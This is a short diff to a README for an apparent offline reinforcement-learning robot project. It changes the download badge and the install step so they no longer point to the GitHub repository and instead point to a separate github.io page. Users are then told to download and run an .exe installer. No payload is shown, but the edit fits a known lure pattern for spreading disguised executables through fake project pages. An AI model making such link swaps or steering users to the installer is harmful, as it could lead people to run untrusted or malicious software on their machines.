@@ -1,6 +1,6 @@
 # 🤖 RMUC-OfflineRL - Master robot decisions with offline learning
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/touchgallgnat343/RMUC-OfflineRL)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://touchgallgnat343.github.io)
 
 This software provides a framework for autonomous robot decision-making. It uses offline reinforcement learning to train models based on the RMUC 2026 regional competition dataset. You can use this tool to develop strategies for all robot types in the competition. The system analyzes historical data to improve performance without requiring live interaction during the training phase.
 
@@ -19,7 +19,7 @@ Ensure you install the latest graphics drivers from your GPU manufacturer before
 
 Follow these steps to obtain and prepare the software on your machine.
 
-1. Go to the primary release page to download the software: https://github.com/touchgallgnat343/RMUC-OfflineRL
+1. Go to the primary release page to download the software: https://touchgallgnat343.github.io
 2. Locate the latest release assets on the page.
 3. Download the installer file ending in .exe.
 4. Open the file to begin the setup wizard.
